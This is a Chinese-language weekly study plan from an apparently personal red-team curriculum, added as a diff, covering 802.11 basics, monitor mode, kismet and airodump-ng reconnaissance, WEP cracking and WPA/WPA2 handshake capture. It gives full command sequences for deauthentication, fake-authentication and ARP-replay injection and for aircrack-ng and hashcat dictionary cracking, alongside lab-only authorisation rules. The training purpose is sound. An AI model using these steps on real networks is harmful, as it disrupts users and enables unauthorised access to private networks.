@@ -1,0 +1,502 @@
+================================================================================
+第27周：无线安全基础 (无线安全期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+引用红队队员完整学习手册中的案例：
+无线安全渗透场景——企业网络中无线接入点是常见的外部入口，攻击者
+可以在停车场或邻近建筑物处对目标WiFi网络进行渗透。攻击者通过
+无线网卡进入监听模式，捕获WPA握手包，离线破解获得WiFi密码，
+从而进入目标内网。
+
+【本周学习目标】
+1. 理解802.11无线网络协议的基础结构和数据帧类型
+2. 掌握无线网卡的配置、监听模式切换和基础操作
+3. 熟练使用airodump-ng进行无线网络侦察和目标信息收集
+4. 理解WEP加密协议的漏洞原理和破解方法
+5. 掌握WPA/WPA2四步握手机制和握手包捕获+离线破解技术
+6. 建立无线渗透测试的实验环境和安全操作规范
+
+【本周知识清单】
+- 802.11协议基础：
+  - 802.11 b/g/n/ac/ax 各代标准
+  - 2.4GHz vs 5GHz 频段差异
+  - 信道(Channel) 1-14 (2.4GHz) / 36-165 (5GHz)
+  - 802.11数据帧类型：管理帧/控制帧/数据帧
+  - Beacon帧(信标帧)、Probe帧、Authentication帧、Association帧
+- 无线安全协议演进：
+  - WEP (Wired Equivalent Privacy) — 已破解
+  - WPA (Wi-Fi Protected Access) — TKIP, 已破解
+  - WPA2 (802.11i) — CCMP/AES, 握手包攻击
+  - WPA3 — SAE/OWE (较新，攻击难度大)
+- 无线网卡要求：
+  - 支持监听模式(Monitor Mode) 和 数据包注入(Packet Injection)
+  - 推荐芯片：Atheros AR9271, Ralink RT3070, Realtek RTL8812AU
+  - 内核驱动：ath9k_htc, rt2800usb, rtl88x2bu
+  - 推荐USB无线网卡型号：Alfa AWUS036ACH, Alfa AWUS036NHA, TP-Link WN722N v1
+- WEP协议弱点：
+  - RC4流密码算法缺陷
+  - IV(Initialization Vector)太短(24位)，复用率高
+  - 弱IV攻击(KoreK, PTW, FMS)
+  - ARP请求重放攻击
+- WPA/WPA2四步握手(4-Way Handshake)：
+  - EAPOL帧交互：ANonce → SNonce+MIC → GTK+MIC → ACK
+  - 从握手包中提取PBKDF2-HMAC-SHA1计算材料
+  - 离线字典攻击：遍历密码候选，计算PMK，验证MIC
+
+【本周工具清单】
+- airmon-ng — 无线网卡模式管理(监听/管理)
+- airodump-ng — 无线网络侦察，捕获数据帧
+- aireplay-ng — 数据包注入攻击(deauth/fake auth/ARP replay)
+- aircrack-ng — WEP/WPA离线密码破解
+- kismet — 替代airodump的无线侦察工具(含GUI)
+- iwconfig / iw — 无线网卡配置
+- Wireshark — 分析捕获的pcap文件，查看握手包
+- hashcat — 更快GPU加速WPA密码破解(备选)
+- reaver / bully — WPS PIN攻击(备选，下周重点)
+- wpaclean / pyrit — WPA握手包处理和优化
+
+================================================================================
+周一：802.11协议与无线安全基础
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：802.11无线网络协议基础
+    - 802.11协议族概述：
+      - 802.11b (1999): 2.4GHz, 11Mbps
+      - 802.11g (2003): 2.4GHz, 54Mbps
+      - 802.11n (2009): 2.4GHz/5GHz, 600Mbps, MIMO
+      - 802.11ac (2013): 5GHz, 6.9Gbps, MU-MIMO
+      - 802.11ax (2021): 2.4GHz/5GHz/6GHz, Wi-Fi 6
+    - 802.11信道规划：
+      - 2.4GHz: 14个信道(5MHz间隔)，信道1/6/11互不重叠
+      - 5GHz: 更多信道，更少干扰
+    - 802.11帧类型详解：
+      - 管理帧: Beacon(AP宣告), Probe Request/Response(探测), Authentication, Deauthentication, Association
+      - 控制帧: RTS, CTS, ACK
+      - 数据帧: 承载实际数据
+    - WLAN网络架构模式：
+      - Infrastructure Mode (星形AP模式) — 最常见
+      - Ad-hoc Mode (对等模式)
+      - Monitor Mode (监听模式) — 渗透测试使用
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/01-无线网络基础.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：识别本机无线网卡并了解基本无线命令
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/01-无线网络基础.txt
+
+  操作步骤：
+    Step 1: 查看系统中无线网卡
+      iwconfig → 列出所有无线接口(wlan0, wlp2s0等)
+      iw dev → 用iw命令查看
+      lsusb → 查看USB无线网卡芯片信息
+      lspci | grep -i network → 查看PCI无线网卡
+    Step 2: 确认无线网卡支持的功能
+      iw list → 查看网卡支持的所有模式
+      查找 "monitor" 和 "AP" 模式支持情况
+      查找 "Supported interface modes" 段落
+    Step 3: 查看当前WiFi网络信息
+      在管理模式下(Managed Mode):
+        iw dev wlan0 scan | grep -E "SSID|signal|freq|BSS"
+        nmcli dev wifi list (NetworkManager方式)
+      记录附近WiFi: SSID名称, MAC地址, 信道, 信号强度, 加密方式
+    Step 4: 了解aircrack-ng套件
+      which airmon-ng (确认已安装aircrack-ng)
+      如未安装: sudo apt install aircrack-ng
+      man airodump-ng → 了解常用参数
+      man aireplay-ng → 了解注入攻击参数
+      man aircrack-ng → 了解破解参数
+    Step 5: 建立个人无线实验安全准则
+      规则1: 只攻击自己拥有或获得书面授权的网络
+      规则2: 在虚拟机中操作无线网卡(避免影响主机网络)
+      规则3: 使用低功率操作，限制影响范围
+      规则4: 实验后及时停止监听模式
+    Step 6: 安装kismet（备选工具）
+      sudo apt install kismet
+      了解kismet的基本功能和界面
+      (可作为airodump-ng的GUI替代工具)
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：理解802.11帧结构，确认网卡能力和限制
+  - 网卡型号/芯片：____________________
+  - 遇到的问题：____________________
+  - 明日计划：配置监听模式，学习airodump-ng侦察
+
+================================================================================
+周二：无线网卡配置与监听模式
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：监听模式与数据包注入
+    - 无线网卡工作模式详解：
+      - Managed (管理模式): 连接到AP，正常上网
+      - Monitor (监听模式): 接收范围内所有WiFi帧，不需关联
+      - Master (主模式): 自身作为AP工作
+      - Ad-hoc (对等模式): 直接设备间通信
+    - 监听模式切换原理：
+      - 需要驱动支持：Linux内核中的mac80211子系统
+      - airmon-ng 自动处理：创建虚拟接口wlan0mon
+      - 潜在冲突：NetworkManager/wpa_supplicant会自动切换回管理模式
+    - 干扰进程处理：
+      - airmon-ng check kill → 停止可能干扰的进程
+      - 可能关闭NetworkManager、wpa_supplicant、dhclient
+      - 实验后需要恢复网络：service NetworkManager restart
+    - 数据包注入能力：
+      - 部分芯片支持，部分不支持
+      - 使用: aireplay-ng -9 wlan0mon 测试注入能力
+      - 注入测试显示"Injection is working!"→完全支持
+    - 频率与信道选择：
+      - 2.4GHz网卡只能监听2.4GHz信道
+      - 5GHz需要支持5GHz的网卡
+      - 双频网卡: 可切换工作频段
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/01-无线网络基础.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：监听模式切换与无线侦察
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/01-无线网络基础.txt
+
+  操作步骤：
+    Step 1: 切换到监听模式
+      iwconfig → 确认wlan0当前模式(应为Managed)
+      sudo airmon-ng start wlan0
+      输出: (mac80211 monitor mode vif enabled for wlan0 on wlan0mon)
+      iwconfig → 确认wlan0mon出现且Mode为Monitor
+    Step 2: 处理干扰进程
+      sudo airmon-ng check kill
+      该命令会停止可能干扰的进程
+      注意: 可能导致本机网络断开(正常的)
+      实验后再恢复: sudo airmon-ng stop wlan0mon && sudo service NetworkManager restart
+    Step 3: 测试数据包注入能力
+      sudo aireplay-ng -9 wlan0mon
+      查看测试输出:
+        期望看到: "Injection is working!"
+        如果看到: "No answer..." → 网卡不支持注入
+      记录: 支持的注入类型和成功率
+    Step 4: 使用airodump-ng扫描周边WiFi
+      sudo airodump-ng wlan0mon
+      解读输出:
+        BSSID: AP的MAC地址
+        PWR: 信号强度(绝对值越小越强，如-30强于-70)
+        Beacons: 接收到的信标帧数量
+        #Data: 数据帧数量
+        CH: 信道
+        ENC: 加密方式(OPN无加密, WEP, WPA, WPA2, WPA3)
+        AUTH: 认证方式(PSK预共享密钥, MGT企业认证)
+        ESSID: WiFi名称
+        STATION: 连接的客户端MAC地址
+    Step 5: 针对性监听特定网络
+      选择一个目标WiFi网络(测试用):
+        sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
+      参数说明:
+        -c 6: 锁定信道6
+        --bssid: 指定AP的MAC
+        -w capture: 将捕获的数据保存为capture-01.cap文件
+      观察AP下面的STATION列表(连接的客户端)
+    Step 6: 分析捕获的pcap文件
+      停止airodump-ng: Ctrl+C
+      ls capture-01.* → 查看生成的文件(.cap, .csv, .kismet.csv, .kismet.netxml)
+      使用Wireshark打开: wireshark capture-01.cap
+      查看wlan.fc.type过滤器: 管理帧/控制帧/数据帧
+      查看EAPOL帧: eapol (用于WPA握手包)
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握监听模式切换和airodump-ng的基本使用
+  - 网卡注入能力：____________________
+  - 捕获WiFi数量：____________________
+  - 明日计划：学习kismet替代工具和WEP破解
+
+================================================================================
+周三：kismet + airodump-ng侦察
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：无线网络侦察方法论
+    - 被动侦察 vs 主动侦察：
+      - 被动: 只监听不发送任何帧(隐蔽性强)
+      - 主动: 发送Probe Request等帧(可发现隐藏SSID但暴露自己)
+    - kismet架构：
+      - kismet_server: 后台数据采集引擎
+      - kismet_client: 命令行或Web界面
+      - 自动信道跳转(Channel Hopping)
+      - GPS集成(标记WiFi地理坐标 — Wardriving)
+    - 隐藏SSID(Cloaked SSID)发现：
+      - AP不广播ESSID(Beacon中SSID为空)
+      - 但仍然在Probe Response中发送SSID
+      - 可通过Deauth已连接客户端，使其重连时暴露SSID
+    - MAC地址过滤绕过：
+      - 了解环境中允许和禁止的MAC
+      - MAC地址克隆技术
+    - 信号强度与物理定位：
+      - 通过信号强度变化判断AP/目标方位
+      - Wardriving概念（不鼓励非法用途）
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/02-无线侦察与扫描.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：kismet高级侦察和WEP破解准备
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/02-无线侦察与扫描.txt
+
+  操作步骤：
+    Step 1: 启动kismet无线侦察
+      sudo kismet -c wlan0mon
+      浏览器访问: http://localhost:2501
+      观察kismet Web界面的WiFi列表
+      点击特定网络查看详细信息:
+        BSSID, 信道, 加密方式, 信号强度历史
+        客户端列表(MAC, 制造商, 信号强度)
+        数据量统计
+    Step 2: 识别高价值目标
+      在kismet中排序观察:
+        - 信号最强的AP (Physical proximity最有可能)
+        - 客户端最多的AP (捕获握手包机会最大)
+        - WPA2-PSK加密的AP (常见目标)
+        - 使用WEP的AP (极罕见 — 但可练习WEP破解)
+    Step 3: 使用airodump-ng针对性收集
+      选择上述识别的高价值目标:
+        sudo airodump-ng -c <channel> --bssid <BSSID> -w target_scan wlan0mon
+      持续运行15-20分钟
+      观察是否有客户端连接/断开(用于后续Deauth攻击)
+    Step 4: 分析收集结果
+      查看target_scan-01.csv文件
+      确认: BSSID, ESSID, 加密类型, 信道, 客户端列表
+      判断后续攻击手法:
+        WEP → WEP破解 (周四)
+        WPA2-PSK → 握手包捕获 (周五)
+        WPA2-Enterprise → 企业攻击 (第28周)
+        Open → 直接连接
+    Step 5: 练习隐藏SSID发现
+      如果环境中有隐藏SSID（或用自己路由器测试）:
+        在airodump-ng输出中看到 SSID为<length: 0> 的AP
+        当客户端连接时或通过Deauth重连，SSID会短时间暴露
+        使用: sudo aireplay-ng -0 1 -a <BSSID> wlan0mon
+        观察airodump-ng中SSID是否出现
+    Step 6: 导出侦察报告
+      kismet中导出KML/GPSXML格式(如有GPS)
+      整理发现的WiFi信息为表格
+      记录侦察的时间、地点、发现的网络数量和加密分布
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握kismet侦察和隐藏SSID发现技术
+  - 发现的高价值目标：____________________
+  - 加密类型分布：____________________
+  - 明日计划：学习WEP协议的破解方法
+
+================================================================================
+周四：WEP破解
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：WEP加密协议的弱点与破解原理
+    - WEP加密过程回顾：
+      - 使用RC4流密码算法
+      - 密钥 = IV(24位) + WEP Key(40位/104位)
+      - 64位WEP = 24位IV + 40位密钥
+      - 128位WEP = 24位IV + 104位密钥
+    - WEP核心弱点：
+      - IV长度仅24位(2^24=16,777,216种)，高强度流量下快速重复
+      - RC4算法中IV暴露部分密钥信息(Weak IV攻击)
+      - 无重放保护(Fake Auth伪造认证)
+    - WEP破解主要攻击方法：
+      - Passive attack: 捕获大量数据包(等待足够IV)
+        - 需要5000-200000 IVs取决于密钥长度和工具
+      - ARP Request Replay: 主动加速IV收集(最常用)
+        - ARP请求具有固定长度和模式
+        - 通过注入重放ARP请求，AP会用新IV加密响应
+        - 快速生成大量不同的IV
+      - Chopchop与Fragment攻击：
+        - 逐字节解密和注入
+    - aircrack-ng破解过程的四个步骤：
+      1. 准备: airodump-ng 锁定目标WEP网络
+      2. 认证: aireplay-ng -1 假认证到AP
+      3. 加速: aireplay-ng -3 ARP请求重放
+      4. 破解: aircrack-ng 从cap文件中提取密钥
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/03-WEP破解.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：WEP破解完整流程
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/03-WEP破解.txt
+  实验环境：自建WEP热点路由器（建议用旧路由器或树莓派搭建测试环境）
+
+  操作步骤：
+    Step 1: 启动监听并锁定WEP目标
+      sudo airmon-ng start wlan0
+      sudo airodump-ng wlan0mon --encrypt WEP
+      确认ENC列显示WEP
+      记录BSSID, CH, ESSID
+    Step 2: 启动针对性捕获
+      sudo airodump-ng -c <channel> --bssid <BSSID> -w wep_capture wlan0mon
+      保持此窗口运行，打开新终端继续以下步骤
+    Step 3: 假认证(Fake Authentication)到AP
+      sudo aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <自己的MAC> wlan0mon
+      参数:
+        -1: Fake Authentication攻击
+        0: 无重连超时
+        -e: ESSID网络名
+        -a: AP的BSSID
+        -h: 攻击者无线网卡MAC地址
+      成功标志: "Association successful :-)"
+    Step 4: ARP请求重放攻击(加速IV收集)
+      sudo aireplay-ng -3 -b <BSSID> -h <自己的MAC> wlan0mon
+      参数:
+        -3: ARP Replay攻击
+        -b: AP的BSSID
+      等待抓到ARP请求包后自动开始重放
+      airodump-ng窗口的#Data列应快速增长
+    Step 5: 等待足够IV后破解密钥
+      当airodump-ng窗口的#Data列达到10000-20000以上时:
+        在新终端中: sudo aircrack-ng wep_capture-01.cap
+      或指定BSSID: sudo aircrack-ng -b <BSSID> wep_capture-01.cap
+      成功标志: "KEY FOUND! [ XX:XX:XX:XX:XX ]"
+      记录破解的WEP密钥
+    Step 6: 验证破解结果
+      使用破解的密钥连接到WEP网络:
+        创建wpa_supplicant配置文件(如果有WEP支持)
+        或直接在路由器管理界面输入密码验证
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：理解WEP弱点并完成完整的破解流程
+  - 收集到的IV数量：____________________
+  - 破解用时：____________________
+  - 明日计划：学习WPA/WPA2握手包捕获和离线破解
+
+================================================================================
+周五：WPA/WPA2握手包捕获+破解
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：WPA/WPA2握手包攻击原理
+    - WPA/WPA2四步握手机制：
+      步骤1: AP → Client: ANonce (Authenticator Nonce随机数)
+      步骤2: Client → AP: SNonce + MIC (Supplicant Nonce + 消息完整性码)
+      步骤3: AP → Client: GTK + MIC (组临时密钥)
+      步骤4: Client → AP: ACK (确认)
+    - 握手包中的密码学材料：
+      - PMK (Pairwise Master Key) = PBKDF2-HMAC-SHA1(密码, SSID, 4096, 256)
+        - 密码+SSID作为盐通过4096次SHA1哈希迭代生成256位PMK
+      - PTK (Pairwise Transient Key) = PRF(PMK, "Pairwise key expansion", Min(AP_MAC, Client_MAC) || Max(AP_MAC, Client_MAC) || Min(ANonce, SNonce) || Max(ANonce, SNonce))
+      - MIC = HMAC(KCK, EAPOL帧) — 用PTK的一部分(KCK)计算消息完整性码
+    - 破解流程：
+      1. 捕获4步握手包(含ANonce, SNonce, Client_MAC, AP_MAC, MIC)
+      2. 从字典取密码 → 计算PMK → 计算PTK → 计算MIC
+      3. 比较计算MIC与捕获MIC → 匹配则密码正确
+    - Deauthentication攻击原理：
+      - Deauth帧是管理帧，无加密保护
+      - 攻击者伪造AP发送Deauth帧给Client
+      - Client断开后自动重连，触发新的4步握手
+      - 攻击者在握手窗口内捕获EAPOL帧
+    - 破解工具对比：
+      - aircrack-ng: CPU破解，支持字典/wep
+      - hashcat: GPU加速破解，速度远超CPU
+      - john the ripper: 社区版支持WPA
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/04-WPA-WPA2破解.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：WPA/WPA2握手包捕获与离线破解
+  参考文件：/home/a/成长为一个红队/archstrike-wireless教学/04-WPA-WPA2破解.txt
+
+  操作步骤：
+    Step 1: 启动监听并锁定WPA2目标
+      sudo airmon-ng start wlan0
+      sudo airodump-ng wlan0mon
+      选择一个有客户端连接的WPA2网络(WPA2-PSK)
+      记录: BSSID, CH, ESSID, 客户端STATION MAC
+    Step 2: 启动针对性捕获并准备Deauth
+      终端1: sudo airodump-ng -c <channel> --bssid <BSSID> -w wpa_capture wlan0mon
+      保持运行，观察下方STATION列表中的客户端
+    Step 3: 执行Deauthentication攻击（踢客户端下线）
+      终端2: sudo aireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
+      参数:
+        -0: Deauthentication攻击
+        5: 发送5个Deauth包
+        -a: AP的MAC地址
+        -c: 客户端的MAC地址(不指定-c则广播Deauth)
+      观察终端1: 应出现 "WPA handshake: XX:XX:XX:XX:XX:XX" 提示
+      或: airodump-ng右上角出现 "WPA handshake: BSSID"
+    Step 4: 验证握手包是否成功捕获
+      wireshark wpa_capture-01.cap
+      过滤器: eapol
+      确认有4个EAPOL帧(EAPOL-Message 1/4, 2/4, 3/4, 4/4)
+      或使用: aircrack-ng wpa_capture-01.cap (会列出包含握手包的网络)
+      使用: wpaclean cleaned.cap wpa_capture-01.cap 清理无效数据
+    Step 5: 使用aircrack-ng离线破解
+      sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> wpa_capture-01.cap
+      参数:
+        -w: 字典文件路径
+        -b: 目标AP的BSSID
+      破解速度: 取决于CPU性能，rockyou.txt约1400万密码
+      成功标志: "KEY FOUND! [ 密码明文 ]"
+    Step 6: 使用hashcat GPU加速破解（如有GPU）
+      hcxpcapngtool wpa_capture-01.cap -o hash.hc22000 (转换为hashcat格式)
+      hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt
+      参数:
+        -m 22000: WPA-EAPOL-PBKDF2模式
+        -a 0: 字典攻击
+      对比aircrack-ng和hashcat的速度差异
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握WPA握手包捕获技术和离线破解
+  - 成功捕获握手包：____________________
+  - 破解结果：____________________
+  - 明日计划：复习本周内容，练习完整WPA破解流程
+
+================================================================================
+周六：复习日 (2h 复习 + 1h THM)
+================================================================================
+
+📚 复习内容（2小时）
+  1. 重走WPA破解完整流程（捕获握手包→离线破解）
+  2. 整理无线安全攻击流程图（从侦察到破解）
+  3. 制作无线工具速查表（每个工具的关键参数）
+  4. 复习WEP vs WPA vs WPA2 vs WPA3安全差异
+  5. 整理本周遇到的所有技术问题和解决方案
+  6. 检查无线网卡在不同信道上的性能表现
+
+💻 THM练习（1小时）
+  - 登录TryHackMe平台
+  - 完成 "WiFi Hacking 101" 房间
+  - 或搜索Wireless相关的房间进行练习
+  - 目标: 巩固无线侦察和WPA破解的理论知识
+
+📝 复习笔记
+  - 本周最有效的技术：____________________
+  - 需要加强的部分：____________________
+  - 下周预习计划：PMKID攻击、WPS攻击、Rogue AP与Evil Twin
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-wireless教学/01-无线网络基础.txt
+  /home/a/成长为一个红队/archstrike-wireless教学/02-无线侦察与扫描.txt
+  /home/a/成长为一个红队/archstrike-wireless教学/03-WEP破解.txt
+  /home/a/成长为一个红队/archstrike-wireless教学/04-WPA-WPA2破解.txt
+  /home/a/成长为一个红队/网安基础知识/XX-无线网络安全协议.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-wireless教学/01-无线网络基础.txt
+  /home/a/成长为一个红队/archstrike-wireless教学/02-无线侦察与扫描.txt
+  /home/a/成长为一个红队/archstrike-wireless教学/03-WEP破解.txt
+  /home/a/成长为一个红队/archstrike-wireless教学/04-WPA-WPA2破解.txt
+
+在线练习：
+  TryHackMe: WiFi Hacking 101, Wifi Forging, 无线安全相关房间
+  HackTheBox: 暂无专门无线靶机（需自建实验环境）
+
+硬件要求：
+  - 支持监听模式和数据包注入的USB无线网卡
+    推荐: Alfa AWUS036ACH (RTL8812AU), Alfa AWUS036NHA (AR9271)
+          TP-Link WN722N v1 (AR9271), Panda PAU09 (Ralink RT5572)
+  - 或使用虚拟机USB直通功能共享主机无线网卡
+
+工具下载：
+  aircrack-ng: sudo apt install aircrack-ng
+  kismet: sudo apt install kismet
+  hashcat: sudo apt install hashcat
+  hcxtools (hcxpcapngtool): sudo apt install hcxtools
+  Wireshark: sudo apt install wireshark
+  字典文件: /usr/share/wordlists/rockyou.txt.gz (gunzip解压)
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
